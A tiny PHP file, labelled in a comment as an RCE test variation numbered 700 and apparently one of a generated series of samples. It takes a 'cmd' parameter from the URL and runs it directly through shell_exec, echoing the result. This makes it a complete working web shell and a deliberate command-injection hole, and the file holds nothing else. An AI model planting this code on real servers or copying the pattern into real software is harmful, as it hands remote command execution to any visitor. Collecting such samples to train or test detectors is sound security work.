<?php
// RCE test variation #700
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>